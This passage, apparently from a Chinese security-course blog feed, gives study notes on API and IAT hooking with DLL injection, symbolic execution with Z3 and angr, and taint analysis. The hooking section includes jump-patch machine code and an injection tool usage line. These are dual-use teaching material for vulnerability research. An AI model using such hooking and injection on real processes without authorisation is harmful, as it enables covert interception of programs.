title="修改起始代码示例"></a>修改起始代码示例</h3><p>在动态链接库被动态加载到进程的地址空间中后，<strong>将要使用的API函数的所在位置的前几个字节修改为一条跳转指令，跳转到代理函数去执行，在需要调用原API函数时，再将源代码复制过去或者跳转回去。</strong>例如：设自定义函数My_Send的地址为0x0157143F，为了使对Send函数调用转到这里执行，可以嵌入如下汇编代码：<br> mov eax，0157143F； //将自定义函数地址放入寄存器eax，对应机器码B83F145701<br> jmp eax；     //跳转到eax处对应机器码：FFE0<br>CPU仅能识别机器码，所以要将汇编代码对应的最原始的机器码写入到目标API所在内存。上面两行汇编代码对应的机器码为：B83F145701FFE0，一共7个字节。其中第2-5个字节的取值会随自定义函数的地址不同而不同。</p><h3 id="IAT-Hook示例"><a href="#IAT-Hook示例" class="headerlink" title="IAT Hook示例"></a>IAT Hook示例</h3><p>实验三：利用API Hook技术对敏感函数<code>lstrcpy函数</code>进行Hook，获取函数的<strong>输入参数</strong>，进行记录分析。<br><strong>步骤</strong>：</p><ol><li>编写自定义函数：实现检测等需要的功能；</li><li>Hook实现：根据PE文件结构寻找IAT，并将IAT中的目标函数的地址更换为自定义的函数地址；</li><li>DLL注入：将包含IAT Hook代码及自定义的Hook函数的Dll注入到目标文件中。</li></ol><p><strong>第一步</strong>：编写一个动态链接库文件，其中编写自己的Hook函数及其逻辑</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/a28948a0b3ff1f310c555ac5f8cad676.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/a28948a0b3ff1f310c555ac5f8cad676.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/12ff54c8c16cd26a718e3f5489602404.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/12ff54c8c16cd26a718e3f5489602404.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/e8ddf7f471feeeeba67b7089950a26d8.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/e8ddf7f471feeeeba67b7089950a26d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>第二步</strong>：注入DLL文件</p><p>新建Windows控制台程序实现DLL文件注入。 </p><p>USAGE : InjectDll.exe &lt;i|e&gt; <PID> <dll_path>。 调用InjectDll完成注入。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/0c7d025895e8ad9fcb39c497af0434ef.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/0c7d025895e8ad9fcb39c497af0434ef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/def1869dfb71b0e17768d0a26f6e0546.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/def1869dfb71b0e17768d0a26f6e0546.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="符号执行技术"><a href="#符号执行技术" class="headerlink" title="符号执行技术"></a>符号执行技术</h1><h2 id="符号执行基本原理"><a href="#符号执行基本原理" class="headerlink" title="符号执行基本原理"></a>符号执行基本原理</h2><p>符号执行的三个关键点：</p><ul><li>变量符号化</li><li>程序执行模拟<blockquote><p>程序执行模拟，可以收集到哪些信息？程序执行模拟具体是如何工作的？</p></blockquote></li><li>约束求解<blockquote><p>约束求解，对谁求解，得到的结果是什么？</p></blockquote></li></ul><h3 id="程序执行状态"><a href="#程序执行状态" class="headerlink" title="程序执行状态"></a>程序执行状态</h3><p>符号执行具体执行时，程序状态中通常包括：<strong>程序变量的具体值</strong>、<strong>程序指令计数</strong>和<strong>路径约束条件pc</strong>（path constraint）。<br>pc是符号执行过程中对路径上条件分支走向的选择情况，根据状态中的pc变量就可以确定一次符号执行的完整路径。pc初始值为true。<br>举例来说，假设符号执行过程中经过3个与符号变量相关的if条件语句if1、if2、if3，每个条件表达式如下：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/dce88d2413f83107732380ccc832dbe5.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/dce88d2413f83107732380ccc832dbe5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>设引擎在3个if条件分支处分别选择if1：true，if2：true，if3：false，则pc表示为：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/9cee0bbed45b0d57da3bd514b60744ab.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/9cee0bbed45b0d57da3bd514b60744ab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>假设if处的表达式为R≥0，R是一个与符号变量相关的多项表达式，把R≥0称为q，则程序执行到if处时pc可能会表现为下面两种形式之一：<br>(1) pc包含q          (2) pc包含￢q<br><strong>如果符号执行引擎选择进入then分支</strong>，则R≥0的真值为true，pc表现为(1)的形式记为：<img src="/2023/03/15/lou-dong-wa-jue-pian/3263a70aae415cc47daed84d31810797.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/3263a70aae415cc47daed84d31810797.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br><strong>如果选择else分支</strong>，则R≥0的 false真值为，pc表现为(2)的形式，且记为：<img src="/2023/03/15/lou-dong-wa-jue-pian/e9e3eeca059fb8d568dcb1126ad68810.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/e9e3eeca059fb8d568dcb1126ad68810.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>要确定pc对应路径的程序输入参数，只需要使用约束求解器对pc进行求解就可以。</p></blockquote><h3 id="符号传播"><a href="#符号传播" class="headerlink" title="符号传播"></a>符号传播</h3><p>符号传播主要作用是建立符号变量传播的关系，并且更新映射的关系。在实际操作的过程中，通常是将<u>对应内存地址的数据进行变化</u>。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/cafb036a0fe999f4a3eb4224890dd508.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/cafb036a0fe999f4a3eb4224890dd508.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="符号执行树"><a href="#符号执行树" class="headerlink" title="符号执行树"></a>符号执行树</h3><p>如何形式化地表示符号执行的过程呢？程序的所有执行路径可以表示为树，叫做<strong>执行树</strong>。<u>符号执行过程也是对执行树进行遍历的过程。</u></p><ul><li>执行树中的一个节点对应程序中的一条语句，程序语句之间的执行顺序或跳转关系对应执行树中节点间的边，对于每个语句会有两条边与其相连，左子树对应的是if语句的true(then)分支，右子树对应if语句的false(else)分支。</li><li>执行树中还可以包含指令计数、pc(路径约束条件)、变量符号值等程序执行状态信息。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 void foobar(int a,int b)&#123;</span><br><span class="line">2  int x=1,y=0;</span><br><span class="line">3  if(a != 0)&#123;</span><br><span class="line">4    y = 3+x; </span><br><span class="line">5    if (b 0)</span><br><span class="line">6         x = 2*(a+b);</span><br><span class="line">7   &#125;</span><br><span class="line">8  assert(x-y ！=0);</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/lou-dong-wa-jue-pian/679c4c0cd9ab0b565e6849ecea6946d9.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/679c4c0cd9ab0b565e6849ecea6946d9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>符号执行完得到三条路径，可以对路径约束条件pc进行约束求解得到到达该路径的一组输入，结合assert的约束x-y!=0就可以进行求解出触发约束的输入。</p><h3 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h3><p>符号执行得到的约束条件，可以通过<strong>约束求解器</strong>进行求解。<br>主流的约束求解器主要有两种理论模型：<strong>SAT求解器</strong>和<strong>SMT求解器</strong>。</p><ul><li>SAT问题（The Satisfiability Problem，可满足性问题），求解由布尔变量集合组成的布尔表达式，对命题逻辑公式问题适用，但是当前有很多实际应用的问题，并不能直接转换为SAT问题来进行求解。</li><li>SMT（Satisfiability Module Theories，可满足性模理论），求解范围从命题逻辑公式扩展为可以解决一阶逻辑所表达的公式。SMT包含很多的求解方法，通过组合这些方法，可以解决很多问题。</li><li>Z3就是一个典型的约束求解器。</li></ul><h3 id="符号执行方法分类"><a href="#符号执行方法分类" class="headerlink" title="符号执行方法分类"></a>符号执行方法分类</h3><p><strong>静态符号执行</strong>本身不会实际执行程序，通过解析程序和符号值模拟执行，有代价小、效率高的优点，但是存在<strong>路径爆炸</strong>、<strong>误报高</strong>的情况。</p><p><strong>动态符号执行</strong>也称为混合符号执行，它的基本思想是：以<strong>具体的数值</strong>作为输入执行程序代码，在程序实际执行路径的基础上，用符号执行技术对路径进行分析，提取路径的约束表达式，根据路径搜索策略（深度、广度）对约束表达式进行<strong>变形</strong>，求解变形后的表达式并生成新的测试用例，不断迭代上面的过程，<font color=red>直到完全遍历程序的所有执行路径</font>。动态符号执行结合了真实执行和传统符号执行技术的优点，<strong>在真实执行的过程中同时进行符号执行</strong>，可以在保证测试精度的前提下对程序执行树进行快速遍历。</p><p><strong>选择性符号执行</strong>可以对程序员感兴趣的部分进行符号执行，其它的部分使用真实值执行，在特定任务环境下可以进一步提升执行效率。</p><h2 id="Z3约束求解器"><a href="#Z3约束求解器" class="headerlink" title="Z3约束求解器"></a>Z3约束求解器</h2><h3 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h3><p>Z3是一个微软出品的<strong>SMT问题</strong>的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以理解为自动解方程组）。<br>Z3在工业应用中常见于软件验证、程序分析等。由于Z3功能实在强大，也被用于很多其他领域：软件/硬件验证和测试、约束解决、混合系统分析、安全性、生物学（计算机模拟分析）和几何问题。著名的<strong>二进制分析框架angr</strong>也内置了一个修改版的Z3。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/80d266fbde3e5608406ecc456797ba47.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/80d266fbde3e5608406ecc456797ba47.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="Z3常用API"><a href="#Z3常用API" class="headerlink" title="Z3常用API"></a>Z3常用API</h3><ul><li>Solver()：创建一个通用求解器，创建后可以添加约束条件，进行下一步的求解。</li><li>add()：添加约束条件，通常在solver()命令之后。</li><li>check()：通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat。</li><li>model()：在存在解的时候，该函数会将每个限制条件所对应的解集取交集，进而得出正解。</li></ul><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x + y &gt; <span class="number">5</span>, x &gt; <span class="number">1</span>, y &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>打开命令控制台，进入D:\z3-4.8.10\bin\python，执行example.py，如下：</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/3c1c0b43d1085f56337a2dc5c14ca6b7.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/3c1c0b43d1085f56337a2dc5c14ca6b7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="Angr应用示例"><a href="#Angr应用示例" class="headerlink" title="Angr应用示例"></a>Angr应用示例</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Angr是一个<strong>基于python的二进制漏洞分析框架</strong>，它将以前多种分析技术集成进来，它能够进行动态的符号执行分析（如KLEE和Mayhem），也能够进行多种静态分析。</p><p>Windows下安装Angr。首先安装Python3，如果安装了就忽略。可以到python官方网站下载安装版本，选择将python增加到path中。然后，打开命令控制台，使用PIP命令安装angr：pip install angr。</p><p>测试安装。输入命令python，进入python界面，然后输入import angr，如果成功，则说明安装没有问题。</p><h3 id="Angr示例"><a href="#Angr示例" class="headerlink" title="Angr示例"></a>Angr示例</h3><p><strong>Angr官方手册</strong>。GitHub上有angr的开源项目<a href="https://github.com/angr%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9A%84%E6%96%87%E6%A1%A3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%BB%BA%E8%AE%AE%E5%B0%86https://github.com/angr/angr-doc%E9%87%8C%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E6%A1%A3%E4%BB%A5zip%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%9C%AC%E5%9C%B0%E3%80%82">https://github.com/angr以及相关的文档信息，建议将https://github.com/angr/angr-doc里的所有文档以zip方式下载到本地。</a></p><p><strong>angr-doc里有各类Example</strong>，展示了Angr的用法，比如cmu_binary_bomb、simple_heap_overflow等二进制爆破、堆溢出等漏洞挖掘、软件分析的典型案例。<br>以<code>sym-write</code>为例子，来说明angr的用法：</p><ul><li>怎么使用angr?</li><li>使用angr能解决什么问题？</li></ul><p><img src="/2023/03/15/lou-dong-wa-jue-pian/8d7808fea34cb4a2948ce82d7b9caae8.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/8d7808fea34cb4a2948ce82d7b9caae8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>求解步骤：</p><p>变量符号化：将u符号化</p><p>动态符号执行：以具体的数值作为输入执行程序代码，在程序实际执行路径的基础上，用符号执行技术对路径进行分析，提取路径的约束表达式。</p><p>获取路径约束条件</p><p>约束求解</p></blockquote><p><img src="/2023/03/15/lou-dong-wa-jue-pian/c15f5e46ac34dfd704b079a29bce9369.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/c15f5e46ac34dfd704b079a29bce9369.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/9502f30d1f4942f2d6a2c8b0f52521e9.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/9502f30d1f4942f2d6a2c8b0f52521e9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>求解出的结果：<img src="/2023/03/15/lou-dong-wa-jue-pian/fd3767d35a6e163adfd6def63025b959.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/fd3767d35a6e163adfd6def63025b959.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p><img src="/2023/03/15/lou-dong-wa-jue-pian/6e6672b6fd61a47a3550aa647bf612b0.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/6e6672b6fd61a47a3550aa647bf612b0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/26e065167dc8754e89e739a0b183e507.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/26e065167dc8754e89e739a0b183e507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="污点分析技术"><a href="#污点分析技术" class="headerlink" title="污点分析技术"></a>污点分析技术</h1><h2 id="污点分析基本原理"><a href="#污点分析基本原理" class="headerlink" title="污点分析基本原理"></a>污点分析基本原理</h2><p><strong>污点分析</strong>是信息流分析的一种实践技术：如果系统满足了用户定制的信息流策略，那么系统是信息流安全的。<br>污点分析标记程序中的数据（<strong>外部输入数据或者内部数据</strong>）为污点，通过<strong>对带污点数据的传播分析</strong>来达到保护数据完整性和保密性的目的。如果信息从被标记的污点数据传播给未标记的数据,那么需要将未标记的标记为污点数据；如果被标记的污点数据传递到<strong>重要数据区域或者信息泄露点</strong>，那就意味着<font color=red>信息流策略被违反</font>。<br>污点分析被广泛地应用在隐私数据泄露检测、漏洞挖掘等实际领域。</p><p>污点分析可以抽象成一个<strong>三元组（sources，sinks，sanitizers）</strong>的形式：source即<strong>污点源</strong>，代表直接引入不受信任的数据或者机密数据到系统中；sink即<strong>污点汇聚点</strong>，代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性)；<br>sanitizer即<strong>无害处理</strong>，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。</p><ul><li>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理，而直接传播到污点汇聚点。如果不能，说明系统是信息流安全的；否则，说明系统产生了隐私数据泄露或危险数据操作等安全问题。</li><li>可以分成3个阶段：识别污点源和汇聚点、污点传播分析和无害处理。</li></ul><h3 id="识别污点源和汇聚点"><a href="#识别污点源和汇聚点" class="headerlink" title="识别污点源和汇聚点"></a>识别污点源和汇聚点</h3><p><strong>识别污点源和污点汇聚点是污点分析的前提</strong>。 目前，在不同的应用程序中识别污点源和汇聚点的方法各不相同，缺乏通用方法。现有的识别污点源和汇聚点的方法可以大致分成3类：</p><ol><li>使用启发式的策略进行标记，例如把来自程序外部输入的数据统称为“污点”数据，保守地认为这些数据有可能包含恶意的攻击数据；</li><li>根据具体应用程序调用的API或者重要的数据类型，手工标记源和汇聚；</li><li>使用统计或机器学习技术自动地识别和标记污点源及汇聚点。</li></ol><h3 id="污点传播分析"><a href="#污点传播分析" class="headerlink" title="污点传播分析"></a>污点传播分析</h3><p><strong>污点传播分析就是分析污点标记数据在程序中的传播途径</strong>。按照分析过程中关注的程序依赖关系的不同，可以将污点传播分析分为<strong>显式流分析</strong>和<strong>隐式流分析</strong>。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/b72864eb793070c0afc7aaf76c5b485e.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/b72864eb793070c0afc7aaf76c5b485e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>污点传播分析中的<strong>显式流分析</strong>就是分析污点标记如何随程序中变量之间的<strong>数据依赖关系</strong>传播。<br>左图很明显，在对sink点进行污点判定的时候，可以发现代码存在<strong>信息泄漏</strong>的问题，即通过sink点可以推测输入的值。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/db0fa85be4b5cbead863f276bdc0e25d.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/db0fa85be4b5cbead863f276bdc0e25d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>污点传播分析中的<strong>隐式流分析</strong>是分析污点标记如何随程序中变量之间的<strong>控制依赖关系</strong>传播，也就是分析污点标记如何从条件指令传播到其所控制的语句。</p><p>变量X是被污点标记的字符串类型变量，变量Y和变量X之间并没有直接或间接的数据依赖关系(显式流关系)，但<strong>X上的污点标记可以经过控制依赖隐式地传播到Y</strong>。最终，第12行的Y值和X值相同。但是，如果不进行隐式流污点传播分析，第12行的变量Y将不会被赋予污点标记。</p><p>隐式流污点传播一直以来都是一个重要的问题，如果不被正确处理，会使污点分析的结果不精确。<br><strong>欠污染</strong>：由于对隐式流污点传播处理不当导致本应被标记的变量没有被标记的问题称为欠污染(under-taint)问题。<br><strong>过污染</strong>：由于污点标记的数量过多而导致污点变量大量扩散的问题称为过污染(over-taint)问题。</p><p>目前，针对隐式流问题的研究重点是尽量减少欠污染和过污染的情况。</p><h3 id="无害处理"><a href="#无害处理" class="headerlink" title="无害处理"></a>无害处理</h3><p>污点数据在传播的过程中可能会经过无害处理模块，<strong>无害处理模块是指污点数据经过该模块的处理后，数据本身不再携带敏感信息或者针对该数据的操作不会再对系统产生危害。</strong> 换言之，带污点标记的数据在经过无害处理模块后，污点标记可以被移除。</p><p>正确地使用无害处理可以降低系统中污点标记的数量，提高污点分析的效率，并且避免由于污点扩散导致的分析结果不精确的问题。常数赋值是最直观的无害处理的方式；加密处理、程序验证等在一定程度上，可以认为是无害处理。</p><h2 id="污点分析方法"><a href="#污点分析方法" class="headerlink" title="污点分析方法"></a>污点分析方法</h2><h3 id="显示流分析"><a href="#显示流分析" class="headerlink" title="显示流分析"></a>显示流分析</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>静态污点传播分析(简称静态污点分析)是指在不运行且不修改代码的前提下，通过分析程序变量间的<strong>数据依赖关系</strong>来检测数据能否从污点源传播到污点汇聚点。</p><p>静态污点分析的对象一般是<strong>程序的源码或中间表示</strong>，可以将对污点传播中显式流的静态分析问题转化为对程序中静态数据依赖的分析:首先，根据程序中的函数调用关系<strong>构建调用图</strong>(call graph，简称CG)；然后，在函数内或者函数间根据不同的程序特性进行具体的<strong>数据流传播分析</strong>。</p><p>常见的显式流污点传播方式包括<u>直接赋值传播</u>、<u>通过函数(过程)调用传播</u>以及<u>通过别名(指针)传播</u>。</p><p><img src="/2023/03/15/lou-dong-wa-jue-pian/4d49dab246b1002b83c384bd107198e6.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/4d49dab246b1002b83c384bd107198e6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>由于foo的两个参数对象x和y都是对对象a的引用(Java程序)，二者之间存在<strong>别名</strong>，存在信息泄露。<br>利用数据流分析解决显式污点传播分析中的直接赋值传播和函数调用传播已经相当成熟，研究的重点是<strong>如何为别名传播的分析提供更精确、高效的解决方案</strong>。</p><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>动态污点传播分析(简称动态污点分析)是指在程序运行过程中，通过<strong>实时监控程序的污点数据</strong>在系统程序中的传播来检测数据能否从污点源传播到污点汇聚点。</p><p>动态污点传播分析首先需要为污点数据扩展一个污点标记(tainted tag)的标签并将其存储在<strong>存储单元(内存、寄存器、缓存等)<strong>中，然后根据指令类型和指令操作数设计相应的</strong>传播逻辑</strong>传播污点标记。</p><p>动态污点传播分析按照实现层次被分为三类：</p><ul><li>基于<strong>硬件</strong>的污点传播分析需要定制的硬件支持，一般需要在原有体系结构上为寄存器或者内存扩展一个标记位，用来存储污点标记。</li><li>基于<strong>软件</strong>的污点传播分析通过修改程序的二进制代码来进行污点标记位的存储与传播。基于软件的污点传播的优点在于不必更改处理器等底层的硬件，并且可以支持更高的语义逻辑的安全策略，但缺点是使用插桩或代码重写修改程序往往会给分析系统带来巨大的开销。基于硬件的污点传播分析虽然可以利用定制硬件降低开销，但通常不能支持更高的语义逻辑的安全策略，并且需要对处理器结构进行重新设计。</li><li>混合型的污点分析是对上述两类方法的折中。</li></ul><p><font color=red>如何降低分析代价？</font></p><p>动态污点传播分析的一个研究重点是<u>如何降低分析代价</u>。基于硬件的分析技术需要定制硬件的支持，基于软件的技术由于程序插桩或代码重写会带来额外的性能开销。</p><ul><li>一类研究思路是<strong>有选择地对系统中的指令进行污点传播分析</strong>。例如，LIFT提出的快速路径(fast-path)优化技术通过提前判断一个模块的输入和输出是否是具有威胁的(如果没有威胁，则无需进行污点传播)以降低需要重写的代码的数量；</li><li>另外一类思路是<strong>使用低开销的机制代替高开销机制</strong>。例如，LIFT的快速切换(fast switch)优化使用低开销的lahf/sahf指令代替高开销的pushq/popq指令,以提高插桩代码与原始二进制文件之间的切换效率。</li></ul><h3 id="隐式流分析"><a href="#隐式流分析" class="headerlink" title="隐式流分析"></a>隐式流分析</h3><p>污点传播分析中的隐式流分析就是分析污点数据如何通过控制依赖进行传播，如果忽略了对隐式流污点传播的分析，则会导致欠污染的情况；如果对隐式流分析不当，那么除了欠污染之外，还可能出现过污染的情况。 </p><h4 id="静态隐式流分析"><a href="#静态隐式流分析" class="headerlink" title="静态隐式流分析"></a>静态隐式流分析</h4><p>面临的核心问题是<strong>精度与效率不可兼得</strong>的问题。<br>精确的隐式流污点传播分析需要分析每一个分支控制条件是否需要传播污点标记。路径敏感的数据流分析往往会产生<strong>路径爆炸</strong>问题，导致开销难以接受。<br>简单的静态传播(标记)分支语句的污点标记方法是将控制依赖于它的语句全部进行污点标记，但该方法会导致一些并不携带隐私数据的变量被标记，导致过污染情况的发生。</p><h4 id="动态隐式流分析"><a href="#动态隐式流分析" class="headerlink" title="动态隐式流分析"></a>动态隐式流分析</h4><p>有三个问题需要解决：</p><ul><li>如何确定污点控制条件下需要标记的语句的<strong>范围</strong>？<blockquote><p>动态执行轨迹并不能反映出被执行的指令之间的控制依赖关系</p></blockquote></li><li>由于部分泄漏导致的<strong>漏报</strong>如何解决？<blockquote><p>指污点信息通过动态未执行部分进行传播并泄漏</p></blockquote></li><li>如何选择合适的污点标记分支进行污点传播？<blockquote><p>鉴于单纯地将所有包含污点标记的分支进行传播会导致过污染的情况</p></blockquote></li></ul><h5 id="如何确定污控制条件下需要标记的语句的范围"><a href="#如何确定污控制条件下需要标记的语句的范围" class="headerlink" title="如何确定污控制条件下需要标记的语句的范围"></a>如何确定污控制条件下需要标记的语句的范围</h5><p><img src="/2023/03/15/lou-dong-wa-jue-pian/af07f140542ca315099a7f87ac101e1a.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/af07f140542ca315099a7f87ac101e1a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><u>动态执行轨迹并不能反映出被执行的指令之间的控制依赖关系</u><br>目前的研究多采用<strong>离线的静态分析</strong>辅助判断动态污点传播中的隐式流标记范围。<br>利用离线静态分析得到的控制流图节点间的后支配关系来解决动态污点传播中的隐式流标记问题。</p><h5 id="如何解决部分泄露导致的误报"><a href="#如何解决部分泄露导致的误报" class="headerlink" title="如何解决部分泄露导致的误报"></a>如何解决部分泄露导致的误报</h5><p><img src="/2023/03/15/lou-dong-wa-jue-pian/bb4cdb9d8a3dcffa06f14d9cd72d7ff6.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/bb4cdb9d8a3dcffa06f14d9cd72d7ff6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>部分泄漏是指<strong>污点信息通过动态未执行部分进行传播并泄漏</strong>。</p><p>攻击者由第11行y等于false的条件能够反推出程序执行了第3行的分支条件，程序实际上存在信息泄漏的问题—cookie不是abc。</p><p>可以对污点分支控制范围内的所有赋值语句中的变量都进行标记？？-&gt;然而，过污染！！</p><h5 id="如何选择合适的污点标记分支进行污点传播"><a href="#如何选择合适的污点标记分支进行污点传播" class="headerlink" title="如何选择合适的污点标记分支进行污点传播"></a>如何选择合适的污点标记分支进行污点传播</h5><p><img src="/2023/03/15/lou-dong-wa-jue-pian/2205fda729b04cad2835da6e5b4ee744.png" class="lazyload placeholder" data-srcset="/2023/03/15/lou-dong-wa-jue-pian/2205fda729b04cad2835da6e5b4ee744.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>单纯地将所有包含污点标记的分支进行传播会导致过污染的情况</p><p>如果传播策略为只要分支指令中包含污点标记就对其进行传播，则三条分支语句后支配语句全部被标记。</p><p>a等于10的情况：攻击者可以根据第12行泄漏的x的值直接还原出污点源处a的值<br>a大于10且小于或等于13的情况：攻击者也只需要尝试3次就可以还原信息<br>a小于10的情况：还原信息的几率显著低于前两种，无需污点标记</p><blockquote><p>根据信息泄漏范围的不同，定量地设计污点标记分支的选择策略</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>道高一尺，魔高一丈。<br>符号执行、污点分析，依然在路上。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用网络安全协议</title>
      <link href="/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/"/>
      <url>/2023/03/15/shi-yong-wang-luo-an-quan-xie-yi/</url>
      
